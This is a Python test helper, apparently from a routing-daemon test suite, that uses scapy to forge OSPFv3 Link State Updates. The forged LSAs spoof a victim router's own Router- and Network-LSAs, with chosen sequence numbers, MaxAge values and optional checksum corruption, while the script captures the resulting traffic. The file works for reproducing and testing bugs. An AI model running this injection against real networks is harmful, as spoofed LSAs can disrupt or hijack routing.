#!/usr/bin/env python3
# SPDX-License-Identifier: ISC
#
# fightback_inject6.py
#
# Copyright (c) 2026 Bing Shui <bingshui@smail.nju.edu.cn>
#
"""Sniff OSPFv3 traffic on the attacker-facing interface while injecting
forged self-originated LSAs at the victim.

Used by test_ospf6_fightback_pacing.py.  Packet layout and timing follow
the original reproducer (topo-fuzz
test/manul/ospf6_fightback_pacing.py):

- an OSPFv3 Link State Update (type 4) carrying one LSA whose
  advertising router is the victim, sent from the peer global address
  to the victim global address with hop limit 1 and next header 89;
- the LSA body is all zeroes (the fight-back refresh reoriginates the
  real body from the lsdb_self template, so only the LSA header needs
  a valid checksum);
- key "A" targets the victim's Router-LSA (type 0x2001, LS ID 0),
  key "B" targets the victim's Network-LSA (type 0x2002, LS ID read
  from the victim LSDB);
- each spec sends one LSA with the given sequence number and age
  (3600 for the self-MaxAge bypass path), spaced SPACING apart.

Prints one line "O6FP_CAPTURE_JSON=<json>" with the injected packets
and every LSA observed on the wire, relative to capture start.
"""

import argparse
import json
import socket
import struct
import time

from scapy.all import Ether, IPv6, AsyncSniffer, Raw, conf, sendp, wrpcap

conf.verb = 0

OSPF6_LSTYPE_ROUTER = 0x2001
OSPF6_LSTYPE_NETWORK = 0x2002


def internet_checksum(data):
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    total = (total & 0xFFFF) + (total >> 16)
    total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def fletcher_checksum(lsa):
    """OSPFv3 LSA checksum: Fletcher over the LSA skipping the age field,
    checksum field zeroed (offset 14 from the type field)."""
    data = bytearray(lsa[2:])
    data[14:16] = b"\x00\x00"
    c0 = 0
    c1 = 0
    for value in data:
        c0 = (c0 + value) % 255
        c1 = (c1 + c0) % 255
    x = ((len(data) - 14 - 1) * c0 - c1) % 255
    if x == 0:
        x = 255
    y = 510 - c0 - x
    if y > 255:
        y -= 255
    data[14:16] = bytes((x, y))
    valid = bytearray(data)
    c0 = 0
    c1 = 0
    for value in valid:
        c0 = (c0 + value) % 255
        c1 = (c1 + c0) % 255
    assert (c1 << 8) + c0 == 0
    return (x << 8) | y


def ipv6_ph_checksum(src, dst, payload):
    """OSPFv3 packet checksum: Internet checksum over the IPv6
    pseudo-header plus the OSPF packet (checksum field zeroed)."""
    pseudo = (
        socket.inet_pton(socket.AF_INET6, src)
        + socket.inet_pton(socket.AF_INET6, dst)
        + struct.pack("!I", len(payload))
        + b"\x00\x00\x00"
        + bytes((89,))
    )
    return internet_checksum(pseudo + payload)


def make_lsa(ls_type, ls_id, adv_router, seq, age, body, corrupt):
    header = struct.pack(
        "!HH4s4sIHH",
        age,
        ls_type,
        socket.inet_aton(ls_id),
        socket.inet_aton(adv_router),
        seq,
        0,
        20 + len(body),
    )
    lsa = bytearray(header + body)
    struct.pack_into("!H", lsa, 16, fletcher_checksum(lsa))
    if corrupt:
        lsa[17] ^= 0x5A
    return bytes(lsa)


def make_lsu(args, lsa_blobs):
    body = struct.pack("!I", len(lsa_blobs)) + b"".join(lsa_blobs)
    packet = bytearray(
        struct.pack(
            "!BBH4s4sHBB",
            3,
            4,
            16 + len(body),
            socket.inet_aton(args.header_rid),
            socket.inet_aton("0.0.0.0"),
            0,
            0,
            0,
        )
        + body
    )
    checksum = ipv6_ph_checksum(args.src_ip, args.dst_ip, bytes(packet))
    struct.pack_into("!H", packet, 12, checksum)
    assert ipv6_ph_checksum(args.src_ip, args.dst_ip, bytes(packet)) == 0
    return bytes(packet)


def parse_events(packets, epoch):
    events = []
    for packet in packets:
        if not packet.haslayer(IPv6):
            continue
        raw = bytes(packet[IPv6].payload)
        if len(raw) < 16 or raw[0] != 3:
            continue
        packet_type = raw[1]
        declared_length = struct.unpack("!H", raw[2:4])[0]
        if declared_length < 16 or declared_length > len(raw):
            continue
        raw = raw[:declared_length]
        event = {
            "time": round(float(packet.time) - epoch, 6),
            "src": packet[IPv6].src,
            "dst": packet[IPv6].dst,
            "type": packet_type,
        }
        if packet_type == 4 and declared_length >= 20:
            count = struct.unpack("!I", raw[16:20])[0]
            lsas = []
            offset = 20
            for _ in range(count):
                if offset + 20 > declared_length:
                    break
                length = struct.unpack("!H", raw[offset + 18:offset + 20])[0]
                if length < 20 or offset + length > declared_length:
                    break
                lsas.append(
                    {
                        "type": struct.unpack("!H", raw[offset + 2:offset + 4])[0],
                        "id": socket.inet_ntoa(raw[offset + 4:offset + 8]),
                        "adv_router": socket.inet_ntoa(raw[offset + 8:offset + 12]),
                        "seq": struct.unpack("!I", raw[offset + 12:offset + 16])[0],
                        "age": struct.unpack("!H", raw[offset:offset + 2])[0],
                    }
                )
                offset += length
            event["lsas"] = lsas
        events.append(event)
    return events


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--iface", required=True)
    parser.add_argument("--src-ip", required=True)
    parser.add_argument("--dst-ip", required=True)
    parser.add_argument("--src-mac", required=True)
    parser.add_argument("--dst-mac", required=True)
    parser.add_argument("--header-rid", required=True)
    parser.add_argument("--victim-rid", required=True)
    parser.add_argument("--key-a-id", default="0.0.0.0")
    parser.add_argument("--key-b-id", default=None)
    parser.add_argument(
        "--specs-json",
        required=True,
        help='JSON list of {"label","key","seq","age","corrupt"}',
    )
    parser.add_argument("--spacing", type=float, default=0.2)
    parser.add_argument("--tail", type=float, default=2.0)
    parser.add_argument("--pcap", required=True)
    args = parser.parse_args()

    specs = json.loads(args.specs_json)
    sniffer = AsyncSniffer(iface=args.iface, filter="ip6 proto 89", store=True)
    sniffer.start()
    time.sleep(0.4)
    epoch = time.time()
    sent = []
    packets = []
    try:
        for index, spec in enumerate(specs):
            if index:
                time.sleep(args.spacing)
            if spec["key"] == "A":
                blob = make_lsa(
                    OSPF6_LSTYPE_ROUTER,
                    args.key_a_id,
                    args.victim_rid,
                    spec["seq"],
                    spec["age"],
                    b"\x00" * 4,
                    spec.get("corrupt", False),
                )
            else:
                blob = make_lsa(
                    OSPF6_LSTYPE_NETWORK,
                    args.key_b_id,
                    args.victim_rid,
                    spec["seq"],
                    spec["age"],
                    b"\x00" * 4,
                    spec.get("corrupt", False),
                )
            frame = (
                Ether(src=args.src_mac, dst=args.dst_mac)
                / IPv6(src=args.src_ip, dst=args.dst_ip, hlim=1, nh=89)
                / Raw(make_lsu(args, [blob]))
            )
            send_time = time.time()
            sendp(frame, iface=args.iface, count=1, verbose=0)
            sent.append(
                {
                    "label": spec["label"],
                    "key": spec["key"],
                    "seq": spec["seq"],
                    "time": round(send_time - epoch, 6),
                }
            )
        time.sleep(args.tail)
    finally:
        packets = list(sniffer.stop())
    wrpcap(args.pcap, packets)
    print(
        "O6FP_CAPTURE_JSON="
        + json.dumps(
            {
                "iface": args.iface,
                "epoch": epoch,
                "pcap_path": args.pcap,
                "sent": sent,
                "events": parse_events(packets, epoch),
            },
            sort_keys=True,
        )
    )


if __name__ == "__main__":
    main()
